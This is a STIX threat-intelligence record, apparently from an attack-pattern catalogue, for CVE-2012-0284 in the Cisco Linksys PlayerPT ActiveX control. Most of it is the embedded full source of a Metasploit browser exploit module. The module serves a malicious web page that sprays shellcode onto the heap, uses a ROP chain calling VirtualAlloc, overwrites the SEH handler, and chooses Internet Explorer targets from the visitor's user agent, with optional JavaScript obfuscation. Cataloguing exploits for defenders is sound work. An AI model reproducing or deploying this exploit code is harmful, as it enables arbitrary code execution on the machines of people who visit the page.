{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--937d10c6-120c-46fc-9015-d7bb04fcee93",
    "created": "2024-08-14T16:45:16.014488Z",
    "modified": "2024-08-14T16:45:16.014492Z",
    "name": "Cisco Linksys PlayerPT ActiveX Control Buffer Overflow",
    "description": " This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15 as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in the SetSource method, allows to trigger a stack based buffer overflow which leads to code execution under the context of the user visiting a malicious web page. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/cisco_playerpt_setsource.rb",
            "external_id": "cisco_playerpt_setsource.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0284"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{9E065E4A-BD9D-4547-8F90-985DC62A5591}\",\n  #  :method     => \"SetSource\",\n  #  :rank       => NormalRanking\n  #})\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco Linksys PlayerPT ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15\n        as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ\n        Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in\n        the SetSource method, allows to trigger a stack based buffer overflow which leads\n        to code execution under the context of the user visiting a malicious web page.\n      },\n      'Author'         =>\n        [\n          'rgod', # Vuln discovery, PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0284' ],\n          [ 'OSVDB', '80297' ],\n          [ 'EDB', '18641' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x00\\x0d\\x0a\\x5c\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # Cisco Linksys PlayerPT ActiveX Control 1.0.0.15\n          [ 'Automatic', { } ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Spray' => true,\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'OffsetStackBottom' => 8556\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3 / Windows Vista SP2',\n            {\n              'Spray' => true,\n              'SprayBlocks' => 0x185,\n              'SprayOffset' => '0x0',\n              'OffsetStackBottom' => 3220\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'Spray' => false,\n              'OffsetRop' => 160,\n              'Offset' => 456,\n              'Ret' => 0x1002c536, # ADD ESP,0A2C # RETN from PlayerPT.ocx\n              'OffsetStackBottom' => 4108\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-03-22',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n\n  end\n\n  def get_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['SprayOffset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < #{t['SprayBlocks']}; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  # rop chain generated with mona.py\n  def create_rop_chain()\n\n    rop_gadgets =\n      [\n        0x77c2f271,\t# POP EBP # RETN [msvcrt.dll]\n        0x77c2f271,\t# skip 4 bytes [msvcrt.dll]\n        0x77c5335d,\t# POP EBX # RETN [msvcrt.dll]\n        0xffffffff,\t#\n        0x77c127e1,\t# INC EBX # RETN [msvcrt.dll]\n        0x77c127e1,\t# INC EBX # RETN [msvcrt.dll]\n        0x77c4e392,\t# POP EAX # RETN [msvcrt.dll]\n        0x2cfe1467,\t# put delta into eax (-> put 0x00001000 into edx)\n        0x77c4eb80,\t# ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n        0x77c58fbc,\t# XCHG EAX,EDX # RETN [msvcrt.dll]\n        0x77c34de1,\t# POP EAX # RETN [msvcrt.dll]\n        0x2cfe04a7,\t# put delta into eax (-> put 0x00000040 into ecx)\n        0x77c4eb80,\t# ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n        0x77c14001,\t# XCHG EAX,ECX # RETN [msvcrt.dll]\n        0x77c479e2,\t# POP EDI # RETN [msvcrt.dll]\n        0x77c39f92,\t# RETN (ROP NOP) [msvcrt.dll]\n        0x77c3b8ba,\t# POP ESI # RETN [msvcrt.dll]\n        0x77c2aacc,\t# JMP [EAX] [msvcrt.dll]\n        0x77c4e392,\t# POP EAX # RETN [msvcrt.dll]\n        0x77c1110c,\t# ptr to &VirtualAlloc() [IAT msvcrt.dll]\n        0x77c12df9,\t# PUSHAD # RETN [msvcrt.dll]\n        0x77c51025,\t# ptr to 'push esp #  ret ' [msvcrt.dll]\n      ].pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  def get_payload(my_target)\n\n    case my_target.name\n    when /IE 6 on Windows XP SP3/\n      my_payload = \"\\x0c\" * my_target['OffsetStackBottom']\n      return my_payload\n    when /IE 7 on Windows XP SP3 \\/ Windows Vista SP2/\n      my_payload = \"\\x0c\" * my_target['OffsetStackBottom']\n      return my_payload\n    when /IE 8 on Windows XP SP3/\n      my_payload = rand_text_alpha(my_target['OffsetRop'])\n      my_payload << create_rop_chain\n      my_payload << make_nops(my_target['Offset'] - my_payload.length)\n      my_payload << generate_seh_record(my_target.ret)\n      my_payload << payload.encoded\n      my_payload << rand_text_alpha(my_target['OffsetStackBottom'] - my_payload.length)\n      return my_payload\n    end\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1] #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2] #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3] #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[2] #IE 7 on Windows Vista SP2\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    print_status(\"User-agent: #{agent}\")\n\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have a setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    js = \"\"\n\n    if my_target['Spray']\n      p = payload.encoded\n      js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n      js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n      js = get_spray(my_target, js_code, js_nops)\n\n      js = heaplib(js, {:noobfu => true})\n\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n      end\n    end\n\n    sploit = get_payload(my_target)\n    sploit = sploit.gsub(/\"/, \"\\\\\\\"\")\n\n    html = <<-MYHTML\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591' id='obj' /></object>\n    <script>\n      obj.SetSource(\"\",\"\",\"\",\"\",\"#{sploit}\");\n    </script>\n    </body>\n    </html>\n    MYHTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-03-22",
    "x_mitre_platforms": [
        "win'"
    ]
}